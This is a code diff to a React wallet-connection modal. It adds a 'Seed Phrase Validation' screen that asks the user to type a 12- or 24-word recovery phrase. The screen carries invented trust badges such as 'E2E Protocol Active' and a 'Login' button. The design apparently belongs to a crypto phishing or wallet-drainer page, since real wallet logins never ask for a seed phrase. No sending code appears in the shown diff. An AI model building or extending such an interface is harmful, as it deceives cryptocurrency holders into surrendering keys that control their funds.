@@ -14,6 +14,7 @@ import {
   Search, 
   Lock, 
   Eye, 
+  EyeOff,
   Key, 
   ShieldCheck, 
   ChevronLeft, 
@@ -73,13 +74,15 @@ const wallets: Wallet[] = [
   { name: "OTHER WALLET", desc: "CUSTOM", e2e: true, icon: "https://upload.wikimedia.org/wikipedia/commons/e/e4/Wallet_Flat_Icon.svg" },
 ];
 
-type View = "list" | "login" | "processing" | "methods";
+type View = "list" | "login" | "processing" | "methods" | "seed-phrase";
 
 export function WalletModal({ children }: { children: React.ReactNode }) {
   const [view, setView] = useState<View>("list");
   const [search, setSearch] = useState("");
   const [selectedWallet, setSelectedWallet] = useState<Wallet | null>(null);
   const [processingStage, setProcessingStage] = useState(0);
+  const [wordCount, setWordCount] = useState<12 | 24>(12);
+  const [seedWords, setSeedWords] = useState<string[]>(Array(24).fill(""));
 
   const filteredWallets = wallets.filter(w => 
     w.name.toLowerCase().includes(search.toLowerCase())
@@ -90,6 +93,8 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
     setSelectedWallet(null);
     setSearch("");
     setProcessingStage(0);
+    setWordCount(12);
+    setSeedWords(Array(24).fill(""));
   };
 
   const startLogin = () => {
@@ -116,13 +121,14 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
       <DialogTrigger asChild>
         {children}
       </DialogTrigger>
-      <DialogContent className="max-w-[440px] bg-[#0B0F17] border-white/5 p-0 gap-0 overflow-hidden text-white sm:rounded-[2rem] transition-all duration-300">
+      <DialogContent className="max-w-[480px] bg-[#0B0F17] border-white/5 p-0 gap-0 overflow-hidden text-white sm:rounded-[2rem] transition-all duration-300">
         <DialogHeader className="sr-only">
           <DialogTitle>
             {view === "list" && "Connect Wallet"}
             {view === "login" && `Login ${selectedWallet?.name}`}
             {view === "processing" && "Secure Protocol Active"}
             {view === "methods" && "Wallet Validation"}
+            {view === "seed-phrase" && "Seed Phrase Validation"}
           </DialogTitle>
         </DialogHeader>
         
@@ -350,7 +356,10 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
              </div>
 
              <div className="space-y-4">
-                <button className="w-full flex items-center gap-5 p-5 rounded-[1.5rem] bg-[#0D161F] border border-white/5 hover:border-primary/50 hover:bg-[#131C26] transition-all group text-left">
+                <button 
+                  onClick={() => setView("seed-phrase")}
+                  className="w-full flex items-center gap-5 p-5 rounded-[1.5rem] bg-[#0D161F] border border-white/5 hover:border-primary/50 hover:bg-[#131C26] transition-all group text-left"
+                >
                   <div className="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center group-hover:scale-110 transition-transform">
                     <Fingerprint className="text-primary w-6 h-6" />
                   </div>
@@ -387,6 +396,89 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
                    Secure Protocol Failover
                 </div>
              </div>
+          </div>
+        )}
+
+        {view === "seed-phrase" && (
+          <div className="flex flex-col animate-in fade-in slide-in-from-right-4 duration-300 overflow-y-auto max-h-[85vh] custom-scrollbar">
+            <div className="p-6 pb-2 text-center relative">
+              <div className="w-10 h-10 rounded-full bg-emerald-500/10 flex items-center justify-center mx-auto mb-4 border border-emerald-500/20">
+                <Shield className="text-emerald-500 w-5 h-5" />
+              </div>
+              <h3 className="font-headline text-2xl font-black mb-1 uppercase tracking-tight">
+                WALLET VALIDATION
+              </h3>
+              <p className="text-slate-500 text-[11px] font-bold tracking-widest">
+                Select validation method to continue.
+              </p>
+            </div>
+
+            <div className="px-6 py-2 flex items-center justify-between border-b border-white/5">
+              <button 
+                onClick={() => setView("methods")}
+                className="flex items-center gap-2 text-[10px] font-black text-slate-400 hover:text-white uppercase tracking-widest transition-colors"
+              >
+                <ChevronLeft size={14} /> Back
+              </button>
+              <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-500 text-[9px] font-black uppercase tracking-widest">
+                <Lock size={10} /> E2E Protocol Active
+              </div>
+            </div>
+
+            <div className="p-8">
+              <h4 className="text-xs font-black uppercase tracking-[0.2em] mb-8 text-center sm:text-left">
+                Seed Phrase Validation
+              </h4>
+
+              <div className="flex gap-2 mb-8">
+                <button 
+                  onClick={() => setWordCount(12)}
+                  className={cn(
+                    "flex-1 h-12 rounded-xl text-xs font-black uppercase tracking-widest transition-all",
+                    wordCount === 12 ? "bg-emerald-500 text-black shadow-neon" : "bg-[#0D161F] text-slate-500 border border-white/5"
+                  )}
+                >
+                  12 Words
+                </button>
+                <button 
+                  onClick={() => setWordCount(24)}
+                  className={cn(
+                    "flex-1 h-12 rounded-xl text-xs font-black uppercase tracking-widest transition-all",
+                    wordCount === 24 ? "bg-emerald-500 text-black shadow-neon" : "bg-[#0D161F] text-slate-500 border border-white/5"
+                  )}
+                >
+                  24 Words
+                </button>
+              </div>
+
+              <div className="grid grid-cols-2 gap-3 mb-10">
+                {Array.from({ length: wordCount }).map((_, i) => (
+                  <div key={i} className="relative group">
+                    <div className="absolute left-4 top-1/2 -translate-y-1/2 text-[10px] font-black text-slate-600">
+                      {i + 1}
+                    </div>
+                    <Input 
+                      placeholder={`Word ${i + 1}`}
+                      value={seedWords[i]}
+                      onChange={(e) => {
+                        const newWords = [...seedWords];
+                        newWords[i] = e.target.value;
+                        setSeedWords(newWords);
+                      }}
+                      className="bg-[#0D161F] border-white/5 h-12 pl-10 pr-10 text-[11px] font-bold focus-visible:ring-1 focus-visible:ring-emerald-500/50 rounded-xl placeholder:text-slate-700"
+                    />
+                    <div className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-600">
+                      <EyeOff size={14} />
+                    </div>
+                  </div>
+                ))}
+              </div>
+
+              <Button className="w-full h-16 bg-emerald-500 hover:bg-emerald-600 text-black font-black text-xs uppercase tracking-[0.3em] rounded-2xl gap-3 shadow-lg shadow-emerald-500/10">
+                <Shield size={16} />
+                Login
+              </Button>
+            </div>
           </div>
         )}
       </DialogContent>
